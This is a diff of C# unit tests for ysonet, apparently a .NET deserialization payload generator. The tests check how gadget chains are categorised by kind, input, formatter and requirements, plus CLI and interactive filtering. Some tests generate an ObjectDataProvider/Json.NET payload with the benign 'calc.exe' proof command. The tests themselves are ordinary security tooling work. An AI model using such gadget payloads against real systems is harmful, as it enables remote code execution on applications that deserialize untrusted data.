+            AssertEqual(PayloadInput.SourceCodeFile, GadgetFacetReader.DeriveInput(CommandInputType.CsSourceFile), "cs->source-code-file");
+            AssertEqual(PayloadInput.AssemblyFile, GadgetFacetReader.DeriveInput(CommandInputType.DllPath), "dll->assembly-file");
+            AssertEqual(PayloadInput.RemoteUrl, GadgetFacetReader.DeriveInput(CommandInputType.Url), "url->remote-url");
+            AssertEqual(PayloadInput.LocalFile, GadgetFacetReader.DeriveInput(CommandInputType.FilePath), "file->local-file");
+            AssertEqual(PayloadInput.None, GadgetFacetReader.DeriveInput(CommandInputType.Ignored), "ignored->none");
+        }
+
+        private static void ExplicitInputsReplaceDerivedInput()
+        {
+            var set = new GadgetFacetSet().WithInputs(PayloadInput.LocalFile, PayloadInput.UncPath);
+            var cap = GadgetFacetReader.BuildCapability("X", null, null, set,
+                CommandInputType.FilePath, new List<string> { "Json.NET" });
+            AssertSetEqual(cap.Inputs, new[] { PayloadInput.LocalFile, PayloadInput.UncPath },
+                "explicit inputs win over the derived single value");
+        }
+
+        private static void UncategorizedCannotMix()
+        {
+            AssertThrows(() => GadgetFacetReader.BuildCapability("X", null, null,
+                new GadgetFacetSet().WithKinds(PayloadKind.Uncategorized, PayloadKind.CodeExecution),
+                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
+                "uncategorized mixed with a real kind is rejected");
+
+            AssertThrows(() => GadgetFacetReader.BuildCapability("X", null, null,
+                new GadgetFacetSet().WithRequirements("made-up-value"),
+                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
+                "an unknown requirement value is rejected");
+
+            AssertThrows(() => GadgetFacetReader.BuildCapability("X", null, null,
+                new GadgetFacetSet().WithInputs(PayloadInput.Uncategorized, PayloadInput.Command),
+                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
+                "uncategorized mixed with a real input is rejected");
+        }
+
+        private static void VariantFacetInheritanceAndOverride()
+        {
+            // Inheritance across a subclass: ActivitySurrogateSelectorFromFile inherits
+            // the parent's code-execution facets and derives source-code-file input.
+            var fromFile = FindCap("ActivitySurrogateSelectorFromFile", 1);
+            AssertTrue(fromFile != null, "subclass gadget expands");
+            AssertSetEqual(fromFile.Kinds, new[] { PayloadKind.CodeExecution }, "subclass inherits parent kind");
+            AssertSetEqual(fromFile.Inputs, new[] { PayloadInput.SourceCodeFile }, "subclass derives source-code-file");
+
+            // Within a gadget: variant 1 inherits, variant 2 overrides the requirements.
+            var v1 = FindCap("ActivitySurrogateDisableTypeCheck", 1);
+            var v2 = FindCap("ActivitySurrogateDisableTypeCheck", 2);
+            AssertTrue(v1 != null && v2 != null, "both variants expand");
+            AssertTrue(v1.Requirements.Contains(GadgetRequirement.BuiltIn), "variant 1 inherits built-in");
+            AssertTrue(!v1.Requirements.Contains(GadgetRequirement.ExtraAssembly), "variant 1 is not extra-assembly");
+            AssertTrue(v2.Requirements.Contains(GadgetRequirement.ExtraAssembly), "variant 2 override adds extra-assembly");
+        }
+
+        private static void VariantFormatterAndInputAreEffective()
+        {
+            // Variant 1 of XamlAssemblyLoadFromFile opts out of SoapFormatter; variant 2
+            // keeps it. The reader must apply the per-variant formatter exclusion.
+            var v1 = FindCap("XamlAssemblyLoadFromFile", 1);
+            var v2 = FindCap("XamlAssemblyLoadFromFile", 2);
+            AssertTrue(v1 != null && v2 != null, "both variants expand");
+            AssertTrue(!v1.Formatters.Contains("SoapFormatter"), "variant 1 excludes SoapFormatter");
+            AssertTrue(v2.Formatters.Contains("SoapFormatter"), "variant 2 keeps SoapFormatter");
+        }
+
+        private static void OneCapabilityMustMatchAllAxes()
+        {
+            // XamlImageInfo variant 1 = local-file + nested-deserialization; variant 2 =
+            // command + code-execution. No single unit is local-file AND code-execution,
+            // so the correlated query must NOT match, but each axis alone must.
+            var both = new GadgetCategoryQuery();
+            both.Add(CategoryAxis.Input, PayloadInput.LocalFile);
+            both.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
+            AssertTrue(!GadgetCategoryCommand.MatchingGadgetNames(both).Contains("XamlImageInfo"),
+                "no single unit is both local-file and code-execution");
+
+            var inputOnly = new GadgetCategoryQuery();
+            inputOnly.Add(CategoryAxis.Input, PayloadInput.LocalFile);
+            AssertTrue(GadgetCategoryCommand.MatchingGadgetNames(inputOnly).Contains("XamlImageInfo"),
+                "local-file alone matches XamlImageInfo variant 1");
+        }
+
+        private static void MultipleValuesUnionAndAxesIntersection()
+        {
+            var ce = new GadgetCategoryQuery(); ce.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
+            var net = new GadgetCategoryQuery(); net.Add(CategoryAxis.Kind, PayloadKind.Network);
+            var either = new GadgetCategoryQuery();
+            either.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
+            either.Add(CategoryAxis.Kind, PayloadKind.Network);
+
+            int nCe = CliListing.Gadgets(ce).Count;
+            int nNet = CliListing.Gadgets(net).Count;
+            int nEither = CliListing.Gadgets(either).Count;
+            AssertTrue(nCe > 0 && nNet > 0, "both single-value queries match something");
+            AssertTrue(nEither >= nCe && nEither >= nNet, "OR within an axis is a union");
+
+            var ceJson = new GadgetCategoryQuery();
+            ceJson.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
+            ceJson.Add(CategoryAxis.Formatter, "Json.NET");
+            int nCeJson = CliListing.Gadgets(ceJson).Count;
+            AssertTrue(nCeJson <= nCe, "adding a second axis (AND) can only narrow");
+        }
+
+        private static void ExistingFacetAudit()
+        {
+            // Lock representative units so a future edit that silently changes a
+            // gadget's broad category fails loudly.
+            AssertCap("TypeConfuseDelegate", null,
+                new[] { PayloadKind.CodeExecution },
+                new[] { PayloadInput.Command },
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework });
+
+            AssertCap("WindowsClaimsIdentity", 1,
+                new[] { PayloadKind.NestedDeserialization },
+                new[] { PayloadInput.Command },
+                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.NetFramework });
+
+            AssertCap("ObjRef", null,
+                new[] { PayloadKind.Network },
+                new[] { PayloadInput.RemoteUrl },
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework });
+
+            AssertCap("DataSetOldBehaviourFromFile", 1,
+                new[] { PayloadKind.CodeExecution },
+                new[] { PayloadInput.SourceCodeFile },
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.Wpf, GadgetRequirement.NetFramework });
+
+            AssertCap("XamlImageInfo", 1,
+                new[] { PayloadKind.NestedDeserialization },
+                new[] { PayloadInput.LocalFile, PayloadInput.UncPath },
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.Wpf, GadgetRequirement.NetFramework });
+
+            AssertCap("XamlImageInfo", 2,
+                new[] { PayloadKind.CodeExecution, PayloadKind.NestedDeserialization },
+                new[] { PayloadInput.Command },
+                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf, GadgetRequirement.NetFramework });
+        }
+
+        private static void CategoryQueryParsesAllAxes()
+        {
+            GadgetCategoryQuery q; string err;
+            bool ok = GadgetCategoryQuery.TryParse(
+                new[] { "KIND=Code-Execution", "formatter=json.net", "input=UNC-PATH", "Requirement=extra-assembly" },
+                out q, out err);
+            AssertTrue(ok, "valid axes parse: " + err);
+            AssertTrue(q.Kinds.Contains(PayloadKind.CodeExecution), "kind parsed case-insensitively");
+            AssertTrue(q.Formatters.Contains("Json.NET"), "formatter canonicalized to Json.NET");
+            AssertTrue(q.Inputs.Contains(PayloadInput.UncPath), "input parsed");
+            AssertTrue(q.Requirements.Contains(GadgetRequirement.ExtraAssembly), "requirement parsed");
+        }
+
+        private static void CategoryQueryRejectsMalformedValues()
+        {
+            GadgetCategoryQuery q; string err;
+            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "" }, out q, out err), "empty rejected");
+            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "kindcodeexec" }, out q, out err), "missing = rejected");
+            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "foo=bar" }, out q, out err), "unknown axis rejected");
+            AssertTrue(err.Contains("kind") && err.Contains("formatter"), "axis error lists valid axes");
+            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "kind=banana" }, out q, out err), "unknown kind rejected");
+            AssertTrue(err.Contains(PayloadKind.CodeExecution), "value error lists valid values");
+            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "formatter=NoSuchFmt" }, out q, out err), "unknown formatter rejected");
+        }
+
+        private static void CategoryQueryCombinesSelections()
+        {
+            GadgetCategoryQuery q; string err;
+            AssertTrue(GadgetCategoryQuery.TryParse(new[] { "kind=network", "kind=network" }, out q, out err), "parses");
+            AssertEqual(1, q.Kinds.Count, "duplicate values collapse to one");
+        }
+
+        private static void CategoryOptionParsesRepeated()
+        {
+            ysonet.Program.rawCategoryValues.Clear();
+            try
+            {
+                ysonet.Program.options.Parse(new[] { "--category=kind=network", "--category=formatter=Json.NET" });
+                AssertEqual(2, ysonet.Program.rawCategoryValues.Count, "two --category values collected");
+                AssertTrue(ysonet.Program.rawCategoryValues.Contains("kind=network"), "first value captured");
+            }
+            finally
+            {
+                ysonet.Program.rawCategoryValues.Clear();
+            }
+        }
+
+        private static void FilteredGadgetListIsMachineReadable()
+        {
+            GadgetCategoryQuery q; string err;
+            GadgetCategoryQuery.TryParse(new[] { "kind=code-execution" }, out q, out err);
+            var names = CliListing.Gadgets(q);
+            AssertTrue(names.Count > 0, "filtered list is non-empty");
+            var sorted = new List<string>(names);
+            sorted.Sort(StringComparer.OrdinalIgnoreCase);
+            AssertTrue(names.Count == new HashSet<string>(names).Count, "names are unique");
+            for (int i = 0; i < names.Count; i++)
+                AssertEqual(sorted[i], names[i], "names are sorted");
+            AssertTrue(names.Contains("TypeConfuseDelegate"), "a code-execution gadget is listed");
+            AssertTrue(!names.Contains("WindowsPrincipal"), "a pure nested-deserialization gadget is excluded");
+            AssertTrue(!names.Contains("Generic"), "Generic is excluded");
+        }
+
+        private static void UnfilteredGadgetListIsUnchanged()
+        {
+            var baseline = CliListing.Gadgets();
+            var viaNull = CliListing.Gadgets((GadgetCategoryQuery)null);
+            var viaEmpty = CliListing.Gadgets(new GadgetCategoryQuery());
+            AssertEqual(baseline.Count, viaNull.Count, "null query returns the full list");
+            AssertEqual(baseline.Count, viaEmpty.Count, "empty query returns the full list");
+            for (int i = 0; i < baseline.Count; i++)
+            {
+                AssertEqual(baseline[i], viaNull[i], "null query order matches");
+                AssertEqual(baseline[i], viaEmpty[i], "empty query order matches");
+            }
+        }
+
+        private static void CategoryCommandShowsMatchingUnitsAndNoMatches()
+        {
+            // Matching search: ObjRef is the network gadget; its detailed unit shows.
+            var netQ = new GadgetCategoryQuery();
+            netQ.Add(CategoryAxis.Kind, PayloadKind.Network);
+            string outText, errText;
+            int code = CaptureConsole(() => GadgetCategoryCommand.RunHumanSearch(netQ), out outText, out errText);
+            AssertEqual(0, code, "a matching search exits 0");
+            AssertTrue(outText.Contains("(*) ObjRef"), "matching gadget printed to stdout");
+            AssertTrue(outText.Contains("Kind: Network"), "matching unit is detailed");
+
+            // No-match search: a valid but unused vocabulary value.
+            var dosQ = new GadgetCategoryQuery();
+            dosQ.Add(CategoryAxis.Kind, PayloadKind.DenialOfService);
+            code = CaptureConsole(() => GadgetCategoryCommand.RunHumanSearch(dosQ), out outText, out errText);
+            AssertEqual(1, code, "a no-match search exits 1");
+            AssertTrue(string.IsNullOrEmpty(outText.Trim()), "no-match leaves stdout empty");
+            AssertTrue(errText.Contains("No gadgets match"), "no-match explanation on stderr");
+        }
+
+        private static void CategoryCliDispatch()
+        {
+            int exit; string so, se;
+            if (!TryRunYsonet("--category=kind=code-execution", out exit, out so, out se))
+            {
+                Console.Error.WriteLine("  [skip] CategoryCliDispatch: ysonet.exe not found beside the test exe");
+                return;
+            }
+            AssertEqual(0, exit, "standalone search exits 0");
+            AssertTrue(so.Contains("(*) TypeConfuseDelegate"), "standalone search prints matches to stdout");
+
+            TryRunYsonet("--category=kind=denial-of-service", out exit, out so, out se);
+            AssertEqual(1, exit, "no-match search exits 1");
+
+            TryRunYsonet("--category=bad=x", out exit, out so, out se);
+            AssertEqual(1, exit, "malformed axis exits 1");
+            AssertTrue(se.Contains("kind") && se.Contains("formatter"), "malformed axis error lists valid axes");
+
+            TryRunYsonet("-g ObjectDataProvider -f Json.NET -c calc.exe --category=kind=network", out exit, out so, out se);
+            AssertEqual(1, exit, "category with payload generation is rejected");
+            AssertTrue(se.Contains("discovery option"), "rejection explains the conflict");
+
+            TryRunYsonet("--list gadgets --category=input=unc-path", out exit, out so, out se);
+            AssertEqual(0, exit, "list gadgets with a category exits 0");
+            AssertTrue(!so.Contains("(*)") && !so.Contains("Categories"), "filtered list prints names only");
+            AssertTrue(so.Contains("XamlImageInfo"), "filtered list includes a unc-path gadget");
+
+            TryRunYsonet("--list plugins --category=kind=network", out exit, out so, out se);
+            AssertEqual(1, exit, "only the gadgets listing accepts a category query");
+        }
+
+        private static void HelpShowsCategories()
+        {
+            int exit; string so, se;
+            if (!TryRunYsonet("--help", out exit, out so, out se))
+            {
+                Console.Error.WriteLine("  [skip] HelpShowsCategories: ysonet.exe not found beside the test exe");
+                return;
+            }
+            AssertTrue(so.Contains("Categories"), "normal help shows compact categories");
+
+            TryRunYsonet("-g XamlImageInfo --fullhelp", out exit, out so, out se);
+            AssertEqual(0, exit, "gadget-specific full help exits 0");
+            AssertTrue(so.Contains("Categories [variant 1]:"), "specific help shows per-variant categories");
+            AssertTrue(so.Contains("Kind:") && so.Contains("Accepted input:"), "specific help details all axes");
+        }
+
+        // ---- interactive category filter tests --------------------------------
+
+        private static void CategoryFilterModelBehaviors()
+        {
+            var model = CategoryFilterModel.Load(new GadgetCategoryQuery());
+            AssertEqual(CliListing.Gadgets().Count, model.MatchingNames().Count, "no filter shows all gadgets");
+            AssertTrue(model.CountForValue(CategoryAxis.Kind, PayloadKind.CodeExecution) > 0, "code-execution has gadgets");
+
+            var ce = new GadgetCategoryQuery(); ce.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
+            var both = ce.Clone(); both.Add(CategoryAxis.Kind, PayloadKind.Network);
+            AssertTrue(model.MatchingNames(both).Count >= model.MatchingNames(ce).Count, "union within an axis is >= single");
+
+            var ceJson = ce.Clone(); ceJson.Add(CategoryAxis.Formatter, "Json.NET");
+            AssertTrue(model.MatchingNames(ceJson).Count <= model.MatchingNames(ce).Count, "a second axis (AND) narrows");
+        }
+
+        private static void CategoryFilterDriverSelectsAndPersists()
+        {
+            var applied = new GadgetCategoryQuery();
+            var model = CategoryFilterModel.Load(applied);
+            var kindValues = model.ValuesForAxis(CategoryAxis.Kind);
+            AssertTrue(kindValues.Count > 0, "kind axis has values");
+            string first = kindValues[0];
+
+            var keys = new ScriptedKeyReader();
+            keys.Down();     // focus Show(0) -> Payload kind(1)
+            keys.Enter();    // open the kind checklist (highlight on the first value)
+            keys.Type(" ");  // Space toggles the first value
+            keys.Enter();    // apply -> back to the main screen
+            keys.Home();     // focus -> Show
+            keys.Enter();    // Show -> return the result
+
+            var filter = new CategoryFilter(keys, model);
+            CategoryFilterResult result = WithSwallowedError(() => filter.Run());
+            AssertTrue(result != null, "Show returns a result");
+            var exp = new GadgetCategoryQuery(); exp.Add(CategoryAxis.Kind, first);
+            AssertEqual(model.MatchingNames(exp).Count, result.Names.Count, "result matches the model for that value");
+            AssertTrue(applied.Kinds.Contains(first), "the selection persisted into the session query");
+        }
+
+        private static void CategoryFilterEscDiscardsAxisDraft()
+        {
+            var applied = new GadgetCategoryQuery();
+            var model = CategoryFilterModel.Load(applied);
+            var keys = new ScriptedKeyReader();
+            keys.Down().Enter();  // open the kind checklist
+            keys.Type(" ");       // toggle the first value into the draft
+            keys.Escape();        // discard the draft -> main
+            keys.Escape();        // Esc at main -> return null
+            var filter = new CategoryFilter(keys, model);
+            var result = WithSwallowedError(() => filter.Run());
+            AssertTrue(result == null, "Esc at the main screen returns null");
+            AssertEqual(0, applied.Kinds.Count, "Esc discarded the axis draft");
+        }
+
+        private static void CategoryFilterClearAll()
+        {
+            var applied = new GadgetCategoryQuery();
+            applied.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
+            var model = CategoryFilterModel.Load(applied);
+            var keys = new ScriptedKeyReader();
+            keys.Down().Down().Down().Down().Down(); // focus -> [ Clear all ] (row 5)
+            keys.Enter();                            // clear all
+            keys.Escape();                           // exit
+            var filter = new CategoryFilter(keys, model);
+            WithSwallowedError(() => filter.Run());
+            AssertEqual(0, applied.Kinds.Count, "Clear all emptied the selections");
+        }
+
+        private static void CategoryFilterDisablesImpossibleValues()
+        {
+            var applied = new GadgetCategoryQuery();
+            applied.Add(CategoryAxis.Kind, PayloadKind.Network);
+            var model = CategoryFilterModel.Load(applied);
+            AssertEqual(0, model.CountForValue(CategoryAxis.Requirement, GadgetRequirement.ExtraAssembly),
+                "no network gadget needs an extra assembly");
+
+            var reqValues = model.ValuesForAxis(CategoryAxis.Requirement);
+            int idx = reqValues.IndexOf(GadgetRequirement.ExtraAssembly);
+            AssertTrue(idx >= 0, "extra-assembly is a catalog value");
+
+            var keys = new ScriptedKeyReader();
+            keys.Down().Down().Down().Down();  // focus -> Requirements (row 4)
+            keys.Enter();                      // open the checklist
+            for (int i = 0; i < idx; i++) keys.Down();
+            keys.Type(" ");                    // Space on a disabled value: no-op
+            keys.Enter();                      // apply (draft is still empty)
+            keys.Escape();                     // exit
+            var filter = new CategoryFilter(keys, model);
+            WithSwallowedError(() => filter.Run());
+            AssertEqual(0, applied.Requirements.Count, "an impossible value cannot be selected");
+        }
+
+        private static void CategoryFilterDoesNotStack()
+        {
+            // Real-console redraw path (VirtualTerminal, cursor control on): from the
+            // gadget build flow open the category filter (the "[ Filter by category... ]"
+            // row at the bottom of the module list), open an axis checklist, discard
+            // back, then leave. The screens must clear/redraw in place on re-entry; the
+            // filter menu must never stack a second copy on one screen (the reported bug).
+            var frames = DriveFrames(k => k.Enter()    // top -> Build a gadget payload (columns)
+                .End()                                 // jump to the "[ Filter by category... ]" row
+                .Enter()                               // open the category filter
+                .Down().Enter()                        // open the Payload kind checklist
+                .Escape()                              // discard -> back to the main filter
+                .Escape()                              // Esc at the filter -> back to the columns
+                .Escape()                              // leave the columns -> top menu
+                .Escape());                            // quit
+            foreach (Frame f in frames)
+                AssertTrue(RowsContaining(f, "Filter gadgets (optional)") <= 1,
+                    "the category filter must not stack a second menu on one screen");
+            // Sanity: both the filter screen and an axis checklist actually rendered.
+            AssertTrue(AnyFrame(frames, "Filter gadgets (optional)"), "the filter screen rendered");
+            AssertTrue(AnyFrame(frames, "Space: toggle"), "an axis checklist rendered");
+        }
+
+        private static int RowsContaining(Frame f, string needle)
+        {
+            int n = 0;
+            for (int y = 0; y < f.Height; y++)
+                if (f.Row(y).Contains(needle)) n++;
+            return n;
+        }
+
+        private static void ModuleViewShowsCategorySummary()
+        {
+            ModuleView v = ModuleView.FromGadget("XamlImageInfo");
+            AssertTrue(v != null, "gadget view loads");
+            AssertTrue(v.PreviewText().Contains("Categories"), "the gadget preview shows a category summary");
+        }
+
+        private static void GadgetFilterNarrowsAndResets()
+        {
+            var session = new WizardSession();
+            var names = CliListing.Gadgets();
+            var editor = new ModuleEditor(new ScriptedKeyReader(), new MemoryStream(), true, names, session);
+
+            AssertTrue(!editor.IsGadgetFilterActive, "no filter initially");
+            AssertEqual(names.Count, editor.FilteredModuleNames().Count, "no filter shows all gadgets");
+            AssertTrue(editor.ModuleListEntries().Contains(ModuleEditor.FilterActionLabel), "the filter action is offered");
+            AssertTrue(!editor.ModuleListEntries().Contains(ModuleEditor.ResetActionLabel), "no reset action while inactive");
+
+            // Apply a code-execution filter via the session query the editor reads.
+            session.CategorySelections.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
+            AssertTrue(editor.IsGadgetFilterActive, "filter active after a selection");
+            var filtered = editor.FilteredModuleNames();
+            AssertTrue(filtered.Count > 0 && filtered.Count < names.Count, "the filter narrows the list");
+            AssertTrue(filtered.Contains("ObjectDataProvider"), "a code-execution gadget is kept");
+            AssertTrue(!filtered.Contains("WindowsPrincipal"), "a nested-only gadget is dropped");
+            AssertTrue(editor.ModuleListEntries().Contains(ModuleEditor.ResetActionLabel), "the reset action is offered while active");
+            AssertTrue(editor.PickerTitle().Contains("filtered"), "the picker title notes the active filter");
+
+            // Reset clears it.
+            session.CategorySelections.Clear();
+            AssertTrue(!editor.IsGadgetFilterActive, "filter cleared after reset");
+            AssertEqual(names.Count, editor.FilteredModuleNames().Count, "reset restores all gadgets");
+        }
+
+        private static void CategoryFilterInBuildGeneratesSamePayload()
+        {
+            var kindValues = CategoryFilterModel.Load(new GadgetCategoryQuery()).ValuesForAxis(CategoryAxis.Kind);
+            int ceIdx = kindValues.IndexOf(PayloadKind.CodeExecution);
+            AssertTrue(ceIdx >= 0, "code-execution is a catalog value");
+
+            var keys = new ScriptedKeyReader();
+            keys.Enter();                                 // top -> Build a gadget payload
+            keys.Type("Filter by category").Enter();      // module picker: open the filter action
+            keys.Down().Enter();                          // filter: open the Payload kind checklist
+            for (int i = 0; i < ceIdx; i++) keys.Down();
+            keys.Type(" ");                               // select code-execution
+            keys.Enter();                                 // apply
+            keys.Home().Enter();                          // Show -> back to the narrowed module picker
+            keys.Type("ObjectDataProvider").Enter();      // pick it
+            keys.Type("formatter").Enter();               // open the formatter setting
+            keys.Digit(2);                                // Json.NET
+            keys.Type("Generate").Enter();                // generate
+            keys.Escape();                                // leave the form
+            keys.Escape();                                // leave the module picker -> top menu
+            keys.Escape();                                // quit
+
+            string stderr;
+            byte[] got = DriveWizard(keys, out stderr);
+            byte[] expected = GenerateOdpJson("calc.exe");
+            AssertTrue(got.Length > 0, "in-build filter flow produced a payload");
+            AssertTrue(BytesEqual(got, expected), "filtered payload equals the core payload");
+            AssertTrue(stderr.Contains("Filter gadgets (optional)"), "the filter screen was reached from the build flow");
+        }
+
+        private static void PluginFlowHasNoCategoryScreen()
+        {
+            var keys = new ScriptedKeyReader();
+            keys.Digit(2);   // top -> Build a plugin payload (index 1)
+            keys.Escape();   // module list -> top
+            keys.Escape();   // quit
+            string stderr;
+            DriveWizard(keys, out stderr);
+            AssertTrue(stderr.Contains("Pick a plugin"), "plugin flow opens its picker directly");
+            AssertTrue(!stderr.Contains("Filter by category"), "plugin flow offers no category filter action");
+            AssertTrue(!stderr.Contains("Filter gadgets (optional)"), "plugin flow shows no category filter screen");
+        }
+
+        private static void ExistingGadgetFlowReachesPickerDirectly()
+        {
+            var keys = new ScriptedKeyReader();
+            keys.Enter();    // top -> Build a gadget payload (index 0)
+            keys.Escape();   // module list -> top
+            keys.Escape();   // quit
+            string stderr;
+            DriveWizard(keys, out stderr);
+            AssertTrue(stderr.Contains("Pick a gadget"), "the build path opens the gadget picker directly");
+            AssertTrue(stderr.Contains("filter by category"), "the gadget picker hints at the category filter");
+            AssertTrue(!stderr.Contains("Filter gadgets (optional)"), "the filter screen is not shown until requested");
+        }
+
+        // ---- category test helpers --------------------------------------------
+
+        private static GadgetCapability FindCap(string gadget, int? variant)
+        {
+            foreach (var c in GadgetFacetReader.ExpandAll())
+                if (string.Equals(c.GadgetName, gadget, StringComparison.OrdinalIgnoreCase)
+                    && c.VariantNumber == variant)
+                    return c;
+            return null;
+        }
+
+        private static void AssertCap(string gadget, int? variant, string[] kinds, string[] inputs, string[] requirements)
+        {
+            var c = FindCap(gadget, variant);
+            AssertTrue(c != null, gadget + (variant.HasValue ? (" variant " + variant) : "") + " expands");
+            AssertSetEqual(c.Kinds, kinds, gadget + " kinds");
+            AssertSetEqual(c.Inputs, inputs, gadget + " inputs");
+            AssertSetEqual(c.Requirements, requirements, gadget + " requirements");
+        }
+
+        private static void AssertSetEqual(List<string> actual, string[] expected, string msg)
+        {
+            var a = new HashSet<string>(actual ?? new List<string>(), StringComparer.OrdinalIgnoreCase);
+            var e = new HashSet<string>(expected, StringComparer.OrdinalIgnoreCase);
+            AssertTrue(a.SetEquals(e), msg + " (expected [" + string.Join(",", expected)
+                + "], got [" + string.Join(",", (actual ?? new List<string>()).ToArray()) + "])");
+        }
+
+        private static void AssertThrows(Action a, string msg)
+        {
+            bool threw = false;
+            try { a(); } catch { threw = true; }
+            AssertTrue(threw, msg);
+        }
+
+        private static int CaptureConsole(Func<int> action, out string outText, out string errText)
+        {
+            TextWriter prevOut = Console.Out, prevErr = Console.Error;
+            var so = new StringWriter();
+            var se = new StringWriter();
+            Console.SetOut(so);
+            Console.SetError(se);
+            try { return action(); }
+            finally
+            {
+                Console.SetOut(prevOut);
+                Console.SetError(prevErr);
+                outText = so.ToString();
+                errText = se.ToString();
+            }
+        }
+
+        // Run ysonet.exe (built beside the test exe) with the given argument string.
+        // Returns false if the exe is not found, so the caller can skip cleanly.
+        private static bool TryRunYsonet(string args, out int exit, out string outText, out string errText)
+        {
+            exit = 0; outText = ""; errText = "";
+            string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
+            if (!File.Exists(exe))
+                return false;
+            var psi = new System.Diagnostics.ProcessStartInfo(exe, args);
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+            psi.RedirectStandardOutput = true;
+            psi.RedirectStandardError = true;
+            using (var proc = System.Diagnostics.Process.Start(psi))
+            {
+                outText = proc.StandardOutput.ReadToEnd();
+                errText = proc.StandardError.ReadToEnd();
+                if (!proc.WaitForExit(20000)) { try { proc.Kill(); } catch { } }
+                try { exit = proc.ExitCode; } catch { exit = -999; }
+            }
+            return true;
         }
     }
 
